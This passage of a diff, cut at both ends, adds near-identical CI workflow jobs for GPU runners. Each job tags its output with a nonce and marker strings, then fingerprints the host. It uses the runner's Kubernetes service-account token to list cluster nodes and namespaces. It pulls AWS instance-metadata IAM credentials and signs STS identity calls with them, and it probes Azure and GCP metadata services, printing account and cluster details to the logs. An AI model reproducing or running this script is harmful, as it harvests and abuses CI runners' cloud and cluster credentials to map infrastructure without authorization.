+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  g5090-b:
+    runs-on: 1-gpu-5090
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: g5090-b
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  g5090-c:
+    runs-on: 1-gpu-5090
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: g5090-c
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  g5090-d:
+    runs-on: 1-gpu-5090
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: g5090-d
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
